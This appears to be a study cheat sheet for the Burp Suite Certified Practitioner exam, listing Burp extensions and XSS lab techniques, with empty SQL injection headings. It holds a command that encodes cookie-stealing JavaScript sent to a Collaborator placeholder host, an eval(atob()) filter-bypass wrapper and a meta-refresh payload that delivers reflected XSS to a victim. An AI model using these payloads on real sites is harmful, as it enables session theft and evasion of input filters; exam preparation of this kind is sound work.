# <img src="https://icons.iconarchive.com/icons/goescat/macaron/1024/burp-suite-icon.png" width=25> BSCP Methodology

## Table of Contents
* [Useful Burp extensions](#useful-burp-extensions-some-of-them-requires-burpsuite-pro)
* [Cross-Site Scripting Section](#cross-site-scripting-section)
   * [Bypass restrictions method 1](#bypass-restrictions-method-1)
* [Exploit Server Section](#exploit-server-section)
  * [Send exploit to victim (Reflected XSS in search bar)](#send-exploit-to-victim-reflected-xss-in-search-bar)
* [SQL Injection Section](#sql-injection-section)
  * [PostgreSQL](#postgresql)
  * [MySQL](#mysql)
  * [Oracle](#oracle)
  * [SQLite](#sqlite)

## Useful Burp extensions (some of them requires burpsuite pro)
- Hackvertor
- Copy As Python-Requests
- Java Deserialization Scanner | [ysoserial.jar](https://github.com/frohoff/ysoserial) for manual exploitation<b>(prefer because sometime this extension it doesn't work as it should)</b>
- HTTP Request Smuggler


## Cross-Site Scripting Section
You can find an injection point with some payloads from this repository - [PayloadsAllTheThings XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

### Bypass restrictions method 1
Sometimes we found a XSS injection point but with some keyword restrictions, so we have to bypass these restrictions with some techniques like below.
1. Generate the base64 payload

```bash
echo -n "document.location = 'http://<BURP-COLLABORATOR.NET>/?cookie='+document.cookie" |base64
```

2. Insert the base64 payload into atob function
```javascript
eval(atob("BASE64-PAYLOAD"))
<script>eval(atob("BASE64-PAYLOAD"))</script>
```

## Exploit Server Section
#### Send exploit to victim (Reflected XSS in search bar)
With <b>`<meta>`</b> html tag we can redirect the "victim" to our javascript injected search query.
```html
<meta http-equiv="refresh" content='0; URL=https://<LAB_URL>/?search=injection_here' />

<!-- ALL TOGETHER BELOW-->
<meta http-equiv="refresh" content='0; URL=https://<LAB_URL>/?SearchTerm=aa","fd8xsw5l":eval(atob("BASE64-PAYLOAD"))}//' />
```

## SQL Injection Section

### PostgreSQL

### MySQL

### Oracle

### SQLite
